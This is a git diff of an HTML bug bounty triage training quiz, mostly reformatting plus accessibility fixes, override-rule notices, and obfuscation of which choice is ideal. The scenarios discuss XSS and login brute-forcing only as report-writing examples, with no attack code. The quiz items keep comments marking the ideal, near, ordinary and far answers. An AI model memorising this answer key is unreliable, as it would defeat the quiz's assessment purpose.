@@ -8,9 +8,7 @@
     />
     <meta name="color-scheme" content="dark" />
     <meta name="theme-color" content="#04111e" />
-    <title>
-      トリアージ・シミュレーション | Bug Bounty Triage Simulator
-    </title>
+    <title>トリアージ・シミュレーション | Bug Bounty Triage Simulator</title>
     <meta
       name="description"
       content="バグバウンティレポートのトリアージ担当になりきって、欠陥のある申請をどう直すべきかを 13 セクションで判断する学習シミュレーション。"
@@ -1422,6 +1420,22 @@
           transition-duration: 0.001ms !important;
         }
       }
+
+      /* ===== A11y common (focus-visible + 44px touch target) ===== */
+      /* キーボードフォーカス可視化（WCAG 2.4.7）— マウスクリック時は表示しない */
+      :focus {
+        outline: none;
+      }
+      :focus-visible {
+        outline: 2px solid var(--primary-light, #22d3ee);
+        outline-offset: 3px;
+        border-radius: 4px;
+      }
+      /* lang-toggle 等の小型ボタンのタッチターゲット 44×44px 確保 */
+      .lang-toggle button {
+        min-height: 44px;
+        min-width: 44px;
+      }
     </style>
   </head>
   <body>
@@ -1475,7 +1489,14 @@
             </defs>
 
             <!-- 影 -->
-            <ellipse cx="140" cy="186" rx="100" ry="6" fill="#000" opacity="0.45" />
+            <ellipse
+              cx="140"
+              cy="186"
+              rx="100"
+              ry="6"
+              fill="#000"
+              opacity="0.45"
+            />
 
             <!-- クリップボード（茶色） -->
             <rect
@@ -1500,8 +1521,26 @@
               stroke-width="0.6"
             />
             <!-- 上部のクリップ（金属の留め具） -->
-            <rect x="115" y="22" width="50" height="20" rx="3" fill="#9ca3af" stroke="#374151" stroke-width="1" />
-            <rect x="125" y="14" width="30" height="14" rx="2" fill="#d1d5db" stroke="#374151" stroke-width="0.8" />
+            <rect
+              x="115"
+              y="22"
+              width="50"
+              height="20"
+              rx="3"
+              fill="#9ca3af"
+              stroke="#374151"
+              stroke-width="1"
+            />
+            <rect
+              x="125"
+              y="14"
+              width="30"
+              height="14"
+              rx="2"
+              fill="#d1d5db"
+              stroke="#374151"
+              stroke-width="0.8"
+            />
             <circle cx="140" cy="34" r="2.5" fill="#6b7280" />
 
             <!-- 報告書のタイトル -->
@@ -1511,7 +1550,16 @@
             <!-- 13 軸のチェックリスト（行は 4 つ表示） -->
             <g>
               <!-- 行 1 -->
-              <rect x="60" y="88" width="10" height="10" rx="1.5" fill="none" stroke="#1c1917" stroke-width="1.2" />
+              <rect
+                x="60"
+                y="88"
+                width="10"
+                height="10"
+                rx="1.5"
+                fill="none"
+                stroke="#1c1917"
+                stroke-width="1.2"
+              />
               <path
                 class="check-stroke"
                 d="M 62 93 L 65 96 L 69 90"
@@ -1521,10 +1569,26 @@
                 stroke-linecap="round"
                 stroke-linejoin="round"
               />
-              <rect x="76" y="91" width="100" height="4" rx="1" fill="#52525b" />
+              <rect
+                x="76"
+                y="91"
+                width="100"
+                height="4"
+                rx="1"
+                fill="#52525b"
+              />
 
               <!-- 行 2 -->
-              <rect x="60" y="106" width="10" height="10" rx="1.5" fill="none" stroke="#1c1917" stroke-width="1.2" />
+              <rect
+                x="60"
+                y="106"
+                width="10"
+                height="10"
+                rx="1.5"
+                fill="none"
+                stroke="#1c1917"
+                stroke-width="1.2"
+              />
               <path
                 class="check-stroke check-stroke-b"
                 d="M 62 111 L 65 114 L 69 108"
@@ -1534,18 +1598,56 @@
                 stroke-linecap="round"
                 stroke-linejoin="round"
               />
-              <rect x="76" y="109" width="90" height="4" rx="1" fill="#52525b" />
+              <rect
+                x="76"
+                y="109"
+                width="90"
+                height="4"
+                rx="1"
+                fill="#52525b"
+              />
 
               <!-- 行 3：誤り（×） -->
-              <rect x="60" y="124" width="10" height="10" rx="1.5" fill="none" stroke="#1c1917" stroke-width="1.2" />
-              <g class="check-stroke check-stroke-c" stroke="#fb7185" stroke-width="2" stroke-linecap="round">
+              <rect
+                x="60"
+                y="124"
+                width="10"
+                height="10"
+                rx="1.5"
+                fill="none"
+                stroke="#1c1917"
+                stroke-width="1.2"
+              />
+              <g
+                class="check-stroke check-stroke-c"
+                stroke="#fb7185"
+                stroke-width="2"
+                stroke-linecap="round"
+              >
                 <line x1="62" y1="126" x2="68" y2="132" />
                 <line x1="68" y1="126" x2="62" y2="132" />
               </g>
-              <rect x="76" y="127" width="120" height="4" rx="1" fill="#fb7185" opacity="0.7" />
+              <rect
+                x="76"
+                y="127"
+                width="120"
+                height="4"
+                rx="1"
+                fill="#fb7185"
+                opacity="0.7"
+              />
 
               <!-- 行 4 -->
-              <rect x="60" y="142" width="10" height="10" rx="1.5" fill="none" stroke="#1c1917" stroke-width="1.2" />
+              <rect
+                x="60"
+                y="142"
+                width="10"
+                height="10"
+                rx="1.5"
+                fill="none"
+                stroke="#1c1917"
+                stroke-width="1.2"
+              />
               <path
                 class="check-stroke check-stroke-d"
                 d="M 62 147 L 65 150 L 69 144"
@@ -1555,12 +1657,29 @@
                 stroke-linecap="round"
                 stroke-linejoin="round"
               />
-              <rect x="76" y="145" width="70" height="4" rx="1" fill="#52525b" />
+              <rect
+                x="76"
+                y="145"
+                width="70"
+                height="4"
+                rx="1"
+                fill="#52525b"
+              />
             </g>
 
             <!-- スコア表示（右下のスタンプ） -->
             <g transform="translate(196, 152)">
-              <rect x="-22" y="-12" width="44" height="22" rx="2" fill="none" stroke="#dc2626" stroke-width="1.8" transform="rotate(-6)" />
+              <rect
+                x="-22"
+                y="-12"
+                width="44"
+                height="22"
+                rx="2"
+                fill="none"
+                stroke="#dc2626"
+                stroke-width="1.8"
+                transform="rotate(-6)"
+              />
               <text
                 x="0"
                 y="3"
@@ -1570,7 +1689,9 @@
                 font-weight="900"
                 fill="#dc2626"
                 transform="rotate(-6)"
-              >82/100</text>
+              >
+                82/100
+              </text>
             </g>
 
             <!-- 虫眼鏡（左上、ふわふわ移動） -->
@@ -1586,12 +1707,36 @@
                 stroke-linecap="round"
               />
               <!-- 柄のグリップ -->
-              <rect x="50" y="50" width="14" height="16" rx="3" fill="#451a03" stroke="#1c1917" stroke-width="0.6" transform="rotate(48 56 58)" />
+              <rect
+                x="50"
+                y="50"
+                width="14"
+                height="16"
+                rx="3"
+                fill="#451a03"
+                stroke="#1c1917"
+                stroke-width="0.6"
+                transform="rotate(48 56 58)"
+              />
               <!-- リング -->
-              <circle cx="18" cy="18" r="20" fill="none" stroke="#1c1917" stroke-width="3.5" />
+              <circle
+                cx="18"
+                cy="18"
+                r="20"
+                fill="none"
+                stroke="#1c1917"
+                stroke-width="3.5"
+              />
               <circle cx="18" cy="18" r="20" fill="url(#lensGrad)" />
               <!-- レンズの内側のハイライト -->
-              <ellipse cx="11" cy="11" rx="6" ry="4" fill="#ffffff" opacity="0.55" />
+              <ellipse
+                cx="11"
+                cy="11"
+                rx="6"
+                ry="4"
+                fill="#ffffff"
+                opacity="0.55"
+              />
               <!-- レンズに映る「BUG」字 -->
               <text
                 x="18"
@@ -1602,19 +1747,35 @@
                 font-size="9"
                 fill="#0e3149"
                 opacity="0.65"
-              >BUG</text>
+              >
+                BUG
+              </text>
             </g>
 
             <!-- 赤ペン（右下から飛び出す） -->
             <g class="red-pen" transform="translate(232, 158)">
               <!-- ボディ -->
-              <rect x="-5" y="-46" width="10" height="60" rx="2" fill="#dc2626" stroke="#7f1d1d" stroke-width="0.6" />
+              <rect
+                x="-5"
+                y="-46"
+                width="10"
+                height="60"
+                rx="2"
+                fill="#dc2626"
+                stroke="#7f1d1d"
+                stroke-width="0.6"
+              />
               <!-- 黒帯 -->
               <rect x="-5" y="-30" width="10" height="3" fill="#1c1917" />
               <!-- クリップ -->
               <rect x="-7" y="-44" width="3" height="14" fill="#9ca3af" />
               <!-- 先端の金属 -->
-              <polygon points="-5,14 5,14 3,22 -3,22" fill="#9ca3af" stroke="#374151" stroke-width="0.5" />
+              <polygon
+                points="-5,14 5,14 3,22 -3,22"
+                fill="#9ca3af"
+                stroke="#374151"
+                stroke-width="0.5"
+              />
               <polygon points="-3,22 3,22 0,28" fill="#1c1917" />
             </g>
           </svg>
@@ -1663,7 +1824,7 @@
             </a>
             <a
               class="source-item"
-              href="https://docs.hackerone.com/en/articles/8475185-quality-reports"
+              href="https://docs.hackerone.com/en/articles/8475116-quality-reports"
               target="_blank"
               rel="noopener noreferrer"
             >
@@ -1730,7 +1891,7 @@
 
         <div class="choices" id="choices"></div>
 
-        <div id="feedback-area"></div>
+        <div id="feedback-area" aria-live="polite" aria-atomic="true"></div>
 
         <button class="next-btn" id="btn-next" style="display: none"></button>
       </section>
@@ -1766,6 +1927,16 @@
             </div>
           </div>
 
+          <div
+            class="result-comment"
+            id="result-override-notice"
+            style="
+              display: none;
+              border-left: 4px solid var(--danger);
+              background: rgba(251, 113, 133, 0.08);
+            "
+            role="alert"
+          ></div>
           <div class="result-comment" id="result-comment"></div>
 
           <div class="result-actions">
@@ -1830,7 +2001,8 @@
             statTime: "プレイ時間",
             statFormat: "出題形式",
             sourcesTitle: "// 出典・参考リソース",
-            srcRepo: "scgajge12/bug-bounty-report-review（13 軸 100 点の評価フレーム）",
+            srcRepo:
+              "scgajge12/bug-bounty-report-review（13 軸 100 点の評価フレーム）",
             srcH1: "HackerOne · Quality Reports（理想的な報告の指針）",
             srcCvss: "CVSS v3.1 仕様（Severity 評価の基準）",
             startBtn: "トリアージを開始",
@@ -1853,6 +2025,10 @@
             resultReview: "// 軸別レビュー",
             resultYour: "あなたの判断",
             resultAnswer: "理想",
+            overrideNoticeDim12:
+              "**Override rule 発動：Dim 12（Tone & Formatting）= 0** のため、合計点に関わらず BBR-Review の規定により強制的に **Do not submit** バンドへ落ちます。disclosure threat や hoarding を受理してしまうと program 全体に悪い学習を生むため、形式の書き直し依頼と CoC エスカレーションを並行してください。",
+            overrideNoticeDim13:
+              "**Override rule 発動：Dim 13（Quality Contamination）≤ 5** のため、合計点に関わらず BBR-Review の規定により強制的に **Do not submit** バンドへ落ちます。scanner-dump / 手動再現欠如のレポートは『中身の手動検証 first → 形式の書き直し依頼』の substance/form 分離で対応してください。",
             footerBy: "Created by ",
           },
           en: {
@@ -1890,6 +2066,10 @@
             resultReview: "// Axis-by-Axis Review",
             resultYour: "Your call",
             resultAnswer: "Ideal",
+            overrideNoticeDim12:
+              "**Override rule fired: Dim 12 (Tone & Formatting) = 0** — regardless of the total, BBR-Review forces a **Do not submit** band. Paying / accepting a report under a disclosure threat or hoarding trains malicious reporters across the program. Run the form-rewrite request and the CoC escalation in parallel.",
+            overrideNoticeDim13:
+              "**Override rule fired: Dim 13 (Quality Contamination) ≤ 5** — regardless of the total, BBR-Review forces a **Do not submit** band. For scanner-dump / unreproducible reports, use substance/form separation: manually verify the substance first, then request a form rewrite.",
             footerBy: "Created by ",
           },
         };
@@ -1900,8 +2080,10 @@
                の 13 軸 100 点法に準拠。dim 名・配点・観点・Good/Bad 例・
                override rule（Dim 12=0 / Dim 13≤5 → forced "Do not submit"）
                を可能な限り原典に揃えている。
-             - 各シナリオの選択肢は **4 段階のグラデーション** を持ち、
-               kinds: ["ideal", "near", "ordinary", "far"] で意味付け。
+             - 各シナリオの選択肢は **4 段階のグラデーション** を持つ。
+               kind 値（ideal / near / ordinary / far）は _KIND_ENC + _kindAt で
+               1 バイトに圧縮＋qIdx 依存マスクで難読化し、View Source から
+               ideal の位置を直読みされないようにしてある。
                  ideal    (◎) … BBR-Review 準拠の最適解
                  near     (○) … 方向性は正しいが 1〜2 点漏れる
                  ordinary (△) … よくある誤判断
@@ -1925,14 +2107,12 @@
                 "(レポーターは OOS 通告後も追加テストを継続中)",
               en:
                 "Target: https://app-stage.example.com/login\n" +
-                "(Reporter: \"It's under `*.example.com`, so it should be in scope.\")\n" +
+                '(Reporter: "It\'s under `*.example.com`, so it should be in scope.")\n' +
                 "(Reporter kept active testing even after OOS was hinted)",
             },
             context: {
-              ja:
-                "プログラムのスコープ規定は **「In-scope: `*.example.com` / Out-of-scope: `*-stage.*` および `*-dev.*`」** と明記。BBR-Review Dim 1 では、ワイルドカード対象でも **所有権の証明（WHOIS / SSL SAN / 公式 GitHub）** と **本番環境かどうか** が確認軸。さらに **OOS 確定後の active testing は Intigriti v1.3 で明文禁止** で、Dim 12/13 に波及する違反扱いになります。",
-              en:
-                "Program scope: **\"In-scope: `*.example.com` / Out-of-scope: `*-stage.*` and `*-dev.*`\"**. BBR-Review Dim 1 also requires **ownership proof** (WHOIS / SSL SAN / official GitHub) and **production-vs-CDN/staging** confirmation. **Active testing after OOS detection is explicitly banned by Intigriti v1.3** and pollutes Dim 12/13 too.",
+              ja: "プログラムのスコープ規定は **「In-scope: `*.example.com` / Out-of-scope: `*-stage.*` および `*-dev.*`」** と明記。BBR-Review Dim 1 では、ワイルドカード対象でも **所有権の証明（WHOIS / SSL SAN / 公式 GitHub）** と **本番環境かどうか** が確認軸。さらに **OOS 確定後の active testing は Intigriti v1.3 で明文禁止** で、Dim 12/13 に波及する違反扱いになります。",
+              en: 'Program scope: **"In-scope: `*.example.com` / Out-of-scope: `*-stage.*` and `*-dev.*`"**. BBR-Review Dim 1 also requires **ownership proof** (WHOIS / SSL SAN / official GitHub) and **production-vs-CDN/staging** confirmation. **Active testing after OOS detection is explicitly banned by Intigriti v1.3** and pollutes Dim 12/13 too.',
             },
             question: {
               ja: "BBR-Review Dim 1 + プラットフォームコンプライアンスを満たす triage 対応は？",
@@ -1941,46 +2121,33 @@
             choices: [
               {
                 // ◎ ideal
-                ja:
-                  "**Out-of-Scope** クローズ。`*-stage.*` 除外条項を引用し、**OOS 確定後の active testing が Intigriti v1.3 で禁止** されている旨をレポーターに共有。in-scope な本番ワイルドカード対象（例: `app.example.com`）での再検証を案内し、所有権証明（WHOIS / SAN）を添えて再投稿してもらうよう一文添える。",
-                en:
-                  "Close as **Out-of-Scope** citing the `*-stage.*` exclusion. Notify the reporter that **active testing after OOS detection is explicitly banned under Intigriti v1.3**. Invite a retest against an in-scope wildcard production host (e.g. `app.example.com`) with ownership evidence (WHOIS / SAN) attached.",
+                ja: "**Out-of-Scope** クローズ。`*-stage.*` 除外条項を引用し、**OOS 確定後の active testing が Intigriti v1.3 で禁止** されている旨をレポーターに共有。in-scope な本番ワイルドカード対象（例: `app.example.com`）での再検証を案内し、所有権証明（WHOIS / SAN）を添えて再投稿してもらうよう一文添える。",
+                en: "Close as **Out-of-Scope** citing the `*-stage.*` exclusion. Notify the reporter that **active testing after OOS detection is explicitly banned under Intigriti v1.3**. Invite a retest against an in-scope wildcard production host (e.g. `app.example.com`) with ownership evidence (WHOIS / SAN) attached.",
               },
               {
                 // ○ near
-                ja:
-                  "Out-of-Scope クローズではなく **Informative** で受理する（`*.example.com` 配下なので一応報告自体は有効と扱い、報奨金は出さず登録のみ）。",
-                en:
-                  "Close as **Informative** (the asset is under `*.example.com` so technically count it, no bounty, just record).",
+                ja: "Out-of-Scope クローズではなく **Informative** で受理する（`*.example.com` 配下なので一応報告自体は有効と扱い、報奨金は出さず登録のみ）。",
+                en: "Close as **Informative** (the asset is under `*.example.com` so technically count it, no bounty, just record).",
               },
               {
                 // △ ordinary
-                ja:
-                  "本番でも再現する可能性が高いので、自分で本番ホストを active scan してから判定する。",
-                en:
-                  "Active-scan production yourself first, then decide based on what you find.",
+                ja: "本番でも再現する可能性が高いので、自分で本番ホストを active scan してから判定する。",
+                en: "Active-scan production yourself first, then decide based on what you find.",
               },
               {
                 // × far
-                ja:
-                  "規約違反としてレポーターを永久 BAN し、HackerOne / Intigriti 双方に通報する。",
-                en:
-                  "Permanently ban the reporter and report them to HackerOne / Intigriti as a violator.",
+                ja: "規約違反としてレポーターを永久 BAN し、HackerOne / Intigriti 双方に通報する。",
+                en: "Permanently ban the reporter and report them to HackerOne / Intigriti as a violator.",
               },
             ],
-            kinds: ["ideal", "near", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "**スコープ規定は契約**。Dim 1 の rubric では「明示的 OOS 条項あり = OOS クローズ + 再投稿招待」が満点 (6/6)。Informative で温情措置すると `OOS / Informative` の triage outcome 区別が崩れ、ダッシュボード集計を狂わせます。",
-                tip:
-                  "**Tip:** OOS クローズは『拒絶』ではなく『再投稿の招待』として書くのが BBR-Review の流儀。Intigriti v1.3 違反通告は別枠で `program admin` に escalate するのが安全です。",
+                ok: "**スコープ規定は契約**。Dim 1 の rubric では「明示的 OOS 条項あり = OOS クローズ + 再投稿招待」が満点 (6/6)。Informative で温情措置すると `OOS / Informative` の triage outcome 区別が崩れ、ダッシュボード集計を狂わせます。",
+                tip: "**Tip:** OOS クローズは『拒絶』ではなく『再投稿の招待』として書くのが BBR-Review の流儀。Intigriti v1.3 違反通告は別枠で `program admin` に escalate するのが安全です。",
               },
               en: {
-                ok:
-                  "**Scope is contract.** Dim 1 awards full 6/6 only for OOS closure + invitation to resubmit. Soft-closing as Informative breaks the `OOS / Informative` outcome split and skews program-level dashboards.",
-                tip:
-                  "**Tip:** Per BBR-Review's stance, OOS closures read as resubmission invitations, not rejections. Escalate the Intigriti violation separately to `program admin`.",
+                ok: "**Scope is contract.** Dim 1 awards full 6/6 only for OOS closure + invitation to resubmit. Soft-closing as Informative breaks the `OOS / Informative` outcome split and skews program-level dashboards.",
+                tip: "**Tip:** Per BBR-Review's stance, OOS closures read as resubmission invitations, not rejections. Escalate the Intigriti violation separately to `program admin`.",
               },
             },
           },
@@ -1996,10 +2163,8 @@
               en: "[CRITICAL] Big bug found, please read ASAP!!!",
             },
             context: {
-              ja:
-                "BBR-Review Dim 2 が指定するタイトル形式は **`[Vulnerability Type] in [Location/Parameter] leading to [Impact]`**（100〜140 文字）。実体は **`Profile Name` フィールドの Stored XSS で他者プロフィール閲覧時に発火 → アカウント乗っ取り** に至るチェーン。",
-              en:
-                "BBR-Review Dim 2 prescribes the format **`[Vulnerability Type] in [Location/Parameter] leading to [Impact]`** (100–140 chars). Actual finding: **Stored XSS in the `Profile Name` field, fires on profile view → account takeover**.",
+              ja: "BBR-Review Dim 2 が指定するタイトル形式は **`[Vulnerability Type] in [Location/Parameter] leading to [Impact]`**（100〜140 文字）。実体は **`Profile Name` フィールドの Stored XSS で他者プロフィール閲覧時に発火 → アカウント乗っ取り** に至るチェーン。",
+              en: "BBR-Review Dim 2 prescribes the format **`[Vulnerability Type] in [Location/Parameter] leading to [Impact]`** (100–140 chars). Actual finding: **Stored XSS in the `Profile Name` field, fires on profile view → account takeover**.",
             },
             question: {
               ja: "BBR-Review Dim 2 の Good example の形式に最も合致するのはどれですか？",
@@ -2009,37 +2174,32 @@
               {
                 // ○ near
                 ja: "「Stored XSS in profile bio field」（脆弱性クラス + 場所だが impact が無い）",
-                en: "\"Stored XSS in profile bio field\" (type + location, but no impact)",
+                en: '"Stored XSS in profile bio field" (type + location, but no impact)',
               },
               {
                 // ◎ ideal — BBR-Review の Good example をそのまま使用
-                ja: "「Stored XSS in \"Profile Name\" leading to Account Takeover via Session Cookie Theft」",
-                en: "\"Stored XSS in \\\"Profile Name\\\" leading to Account Takeover via Session Cookie Theft\"",
+                ja: '「Stored XSS in "Profile Name" leading to Account Takeover via Session Cookie Theft」',
+                en: '"Stored XSS in \\"Profile Name\\" leading to Account Takeover via Session Cookie Theft"',
               },
               {
                 // △ ordinary — 提出メタのみで中身が無い
                 ja: "「XSS Bug Report — 2024 Q4」（提出メタ情報のみで脆弱性の中身が読み取れない）",
-                en: "\"XSS Bug Report — 2024 Q4\" (administrative metadata; says nothing about the bug)",
+                en: '"XSS Bug Report — 2024 Q4" (administrative metadata; says nothing about the bug)',
               },
               {
                 // × far — BBR-Review の Bad example そのまま
                 ja: "「I can hack your admin panel!!!」（BBR-Review が Bad example として明示）",
-                en: "\"I can hack your admin panel!!!\" (literal Bad example from BBR-Review)",
+                en: '"I can hack your admin panel!!!" (literal Bad example from BBR-Review)',
               },
             ],
-            kinds: ["near", "ideal", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "BBR-Review Dim 2 が満点となるタイトルは **`[Type] in [Location] leading to [Impact]`** の 3 要素必須。triager はタイトル 1 行で **重複検出** と **優先度付け** を行うため、固有名詞・パラメータ名・最終影響を埋めます。Good example: `Stored XSS in \"Profile Name\" leading to Account Takeover` / `IDOR on /api/v1/invoice allows viewing other users' PII`。",
-                tip:
-                  "**Tip:** Bad example は (1) 感情語、(2) 場所未指定、(3) 結果未指定 のいずれか。3 要素チェックリストにすれば取り逃しが減ります。",
+                ok: 'BBR-Review Dim 2 が満点となるタイトルは **`[Type] in [Location] leading to [Impact]`** の 3 要素必須。triager はタイトル 1 行で **重複検出** と **優先度付け** を行うため、固有名詞・パラメータ名・最終影響を埋めます。Good example: `Stored XSS in "Profile Name" leading to Account Takeover` / `IDOR on /api/v1/invoice allows viewing other users\' PII`。',
+                tip: "**Tip:** Bad example は (1) 感情語、(2) 場所未指定、(3) 結果未指定 のいずれか。3 要素チェックリストにすれば取り逃しが減ります。",
               },
               en: {
-                ok:
-                  "Dim 2 awards full marks only when the title carries all three slots: **`[Type] in [Location] leading to [Impact]`**. Triagers use the title for **dedup + priority** in seconds. BBR-Review Good examples: `Stored XSS in \"Profile Name\" leading to Account Takeover` / `IDOR on /api/v1/invoice allows viewing other users' PII`.",
-                tip:
-                  "**Tip:** Bad titles drop one or more of (1) adjective-heavy, (2) no location, (3) no outcome — keep all three as a checklist.",
+                ok: 'Dim 2 awards full marks only when the title carries all three slots: **`[Type] in [Location] leading to [Impact]`**. Triagers use the title for **dedup + priority** in seconds. BBR-Review Good examples: `Stored XSS in "Profile Name" leading to Account Takeover` / `IDOR on /api/v1/invoice allows viewing other users\' PII`.',
+                tip: "**Tip:** Bad titles drop one or more of (1) adjective-heavy, (2) no location, (3) no outcome — keep all three as a checklist.",
               },
             },
           },
@@ -2051,16 +2211,12 @@
             weight: 6,
             section: { ja: "Description", en: "Description" },
             badContent: {
-              ja:
-                "ログインページに脆弱性があります。これはとても危険なので、すぐに直す必要があります。",
-              en:
-                "There is a vulnerability in the login page. This is very dangerous and you must fix it.",
+              ja: "ログインページに脆弱性があります。これはとても危険なので、すぐに直す必要があります。",
+              en: "There is a vulnerability in the login page. This is very dangerous and you must fix it.",
             },
             context: {
-              ja:
-                "BBR-Review Dim 3 は **3〜5 行で (1) 影響 URL/エンドポイント (2) 脆弱性タイプと機構 (3) 最終的な結果** を答えることを要求し、CWE 言及を推奨。実体は **`POST /api/login` にレート制限が無く、Top-1000 dictionary attack で ~3 分・1 IP からアカウントを突破可能** な状態（PoC・観測ログは別途添付済み）。",
-              en:
-                "BBR-Review Dim 3 demands 3–5 lines covering **(1) affected URL/endpoint, (2) vulnerability type and mechanism, (3) ultimate consequence**, with CWE recommended. Reality: **`POST /api/login` lacks rate limiting; a top-1000 dictionary breaks an account in ~3 minutes from a single IP** (PoC + logs attached separately).",
+              ja: "BBR-Review Dim 3 は **3〜5 行で (1) 影響 URL/エンドポイント (2) 脆弱性タイプと機構 (3) 最終的な結果** を答えることを要求し、CWE 言及を推奨。実体は **`POST /api/login` にレート制限が無く、Top-1000 dictionary attack で ~3 分・1 IP からアカウントを突破可能** な状態（PoC・観測ログは別途添付済み）。",
+              en: "BBR-Review Dim 3 demands 3–5 lines covering **(1) affected URL/endpoint, (2) vulnerability type and mechanism, (3) ultimate consequence**, with CWE recommended. Reality: **`POST /api/login` lacks rate limiting; a top-1000 dictionary breaks an account in ~3 minutes from a single IP** (PoC + logs attached separately).",
             },
             question: {
               ja: "BBR-Review Dim 3（3 要素 + CWE）を満たす Description はどれですか？",
@@ -2069,53 +2225,43 @@
             choices: [
               {
                 // ○ near — 何が起きているか + URL は触れているが、根本原因 / 影響 / CWE が抜ける
-                ja:
-                  "「`POST /api/login` にレート制限が無く、辞書攻撃が可能です。詳細は PoC と添付ログを参照ください。」（URL とタイプは入っているが、根本原因・想定影響・CWE が無い）",
-                en:
-                  "\"`POST /api/login` lacks rate limiting; dictionary attacks are feasible. See attached PoC and logs for details.\" (URL + type only — no root cause, no impact, no CWE)",
+                ja: "「`POST /api/login` にレート制限が無く、辞書攻撃が可能です。詳細は PoC と添付ログを参照ください。」（URL とタイプは入っているが、根本原因・想定影響・CWE が無い）",
+                en: '"`POST /api/login` lacks rate limiting; dictionary attacks are feasible. See attached PoC and logs for details." (URL + type only — no root cause, no impact, no CWE)',
               },
               {
                 // ◎ ideal
-                ja:
-                  "「`POST /api/login` に **レート制限・lockout が無く**、Top-1000 password dictionary で `morioka12@example.com` を **~3 分・1 IP** で突破可能 (PoC ログ添付)。**根本原因:** 連続失敗時のカウンタ／IP ベース throttle 不在。**影響:** 本機能を利用する全ユーザー（推定 50k）の認証窃取。**CWE-307** Improper Restriction of Excessive Authentication Attempts。」",
-                en:
-                  "\"`POST /api/login` has **no rate limiting / lockout**; a top-1000 password dictionary breaks `morioka12@example.com` in **~3 minutes from a single IP** (PoC log attached). **Root cause:** no failure counter / IP-based throttle. **Impact:** auth compromise for all ~50k users of this flow. **CWE-307** Improper Restriction of Excessive Authentication Attempts.\"",
+                ja: "「`POST /api/login` に **レート制限・lockout が無く**、Top-1000 password dictionary で `morioka12@example.com` を **~3 分・1 IP** で突破可能 (PoC ログ添付)。**根本原因:** 連続失敗時のカウンタ／IP ベース throttle 不在。**影響:** 本機能を利用する全ユーザー（推定 50k）の認証窃取。**CWE-307** Improper Restriction of Excessive Authentication Attempts。」",
+                en: '"`POST /api/login` has **no rate limiting / lockout**; a top-1000 password dictionary breaks `morioka12@example.com` in **~3 minutes from a single IP** (PoC log attached). **Root cause:** no failure counter / IP-based throttle. **Impact:** auth compromise for all ~50k users of this flow. **CWE-307** Improper Restriction of Excessive Authentication Attempts."',
               },
               {
                 // △ ordinary — Steps に書くべき HTTP ログを Description に詰める誤配置
-                ja:
-                 "Description 欄に 200 行の生 HTTP リクエスト／レスポンスをそのままコピペ（Steps セクションに置くべきログを Description に置いている）。",
-                en:
-                  "Paste 200 lines of raw HTTP request/response into Description (logs that belong in Steps placed into Description instead).",
+                ja: "Description 欄に 200 行の生 HTTP リクエスト／レスポンスをそのままコピペ（Steps セクションに置くべきログを Description に置いている）。",
+                en: "Paste 200 lines of raw HTTP request/response into Description (logs that belong in Steps placed into Description instead).",
               },
               {
                 // × far — quality contamination の典型
-                ja:
-                  "OWASP Authentication Cheat Sheet を全文コピペ。本件への接続は一切記載しない。",
-                en:
-                  "Paste the entire OWASP Authentication Cheat Sheet with no connection to this finding.",
+                ja: "OWASP Authentication Cheat Sheet を全文コピペ。本件への接続は一切記載しない。",
+                en: "Paste the entire OWASP Authentication Cheat Sheet with no connection to this finding.",
               },
             ],
-            kinds: ["near", "ideal", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 3 満点の Description は **対象 → 機構 → 根本原因 → 影響範囲 → CWE** の 5 点を 3〜5 行で言い切るもの。形容詞ではなく **数字・エンドポイント・CWE 番号** で具体化します。BBR-Review が Bad example として挙げる『単一行〈There is XSS〉』『200 行ログ詰め込み』を避けるのが基本動作。",
-                tip:
-                  "**Tip:** 一般化ボイラープレート（OWASP / CWE 説明文の丸コピー）は **Dim 13 quality-contamination check の AI signal #1** にも引っかかります。引用は必ず本件への 1 行接続を添える。",
+                ok: "Dim 3 満点の Description は **対象 → 機構 → 根本原因 → 影響範囲 → CWE** の 5 点を 3〜5 行で言い切るもの。形容詞ではなく **数字・エンドポイント・CWE 番号** で具体化します。BBR-Review が Bad example として挙げる『単一行〈There is XSS〉』『200 行ログ詰め込み』を避けるのが基本動作。",
+                tip: "**Tip:** 一般化ボイラープレート（OWASP / CWE 説明文の丸コピー）は **Dim 13 quality-contamination check の AI signal #1** にも引っかかります。引用は必ず本件への 1 行接続を添える。",
               },
               en: {
-                ok:
-                  "Dim 3 awards full marks for **target → mechanism → root cause → blast radius → CWE** in 3–5 lines. Replace adjectives with numbers, endpoints, CWE IDs. Avoid both BBR-Review Bad examples — single-line \"There is XSS\" and 200-line log dumps in Description.",
-                tip:
-                  "**Tip:** Generic boilerplate (verbatim OWASP / CWE prose) also trips **AI signal #1 in Dim 13's contamination check**. Always attach a one-line link to this specific finding.",
+                ok: 'Dim 3 awards full marks for **target → mechanism → root cause → blast radius → CWE** in 3–5 lines. Replace adjectives with numbers, endpoints, CWE IDs. Avoid both BBR-Review Bad examples — single-line "There is XSS" and 200-line log dumps in Description.',
+                tip: "**Tip:** Generic boilerplate (verbatim OWASP / CWE prose) also trips **AI signal #1 in Dim 13's contamination check**. Always attach a one-line link to this specific finding.",
               },
             },
           },
 
           /* --- 4. Reproduction Steps + Environment (12pt) --- */
           {
-            tag: { ja: "04 · Reproduction Steps", en: "04 · Reproduction Steps" },
+            tag: {
+              ja: "04 · Reproduction Steps",
+              en: "04 · Reproduction Steps",
+            },
             dim: { ja: "再現手順・環境", en: "Reproduction Steps" },
             weight: 12,
             section: { ja: "Steps to Reproduce", en: "Steps to Reproduce" },
@@ -2124,16 +2270,11 @@
                 "1. ログインする\n" +
                 "2. プロフィールをクリック\n" +
                 "3. バグが発生する",
-              en:
-                "1. Log in\n" +
-                "2. Click profile\n" +
-                "3. Bug appears",
+              en: "1. Log in\n" + "2. Click profile\n" + "3. Bug appears",
             },
             context: {
-              ja:
-                "BBR-Review Dim 4（**12 点 / 最重要軸の一つ**）は、専用の **`Environment / Test Accounts` セクション**（target URL / browser / OS / Attacker creds `user1:pass1` / Victim creds `user2:pass2`）と、**番号付き手順 1 アクション 1 ステップ + 完全 HTTP リクエスト（method/path/headers/body）コードブロック** を要求。Bad sign：『前提が途中で出てくる』『IDOR 検証が単一アカウント』『test creds なしで triager が登録を強制される』。",
-              en:
